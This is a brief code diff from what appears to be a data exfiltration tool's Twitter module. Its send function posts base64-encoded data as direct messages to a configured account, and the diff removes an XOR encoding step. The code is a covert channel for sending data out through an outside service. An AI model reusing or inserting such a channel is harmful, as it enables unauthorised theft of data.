@@ -54,7 +54,6 @@ def send(data):
     global api
     if (not api):
         start_twitter()
-    data = app_exfiltrate.xor(data)
     api.send_direct_message(user=USERNAME, text=base64.b64encode(data))
 
 
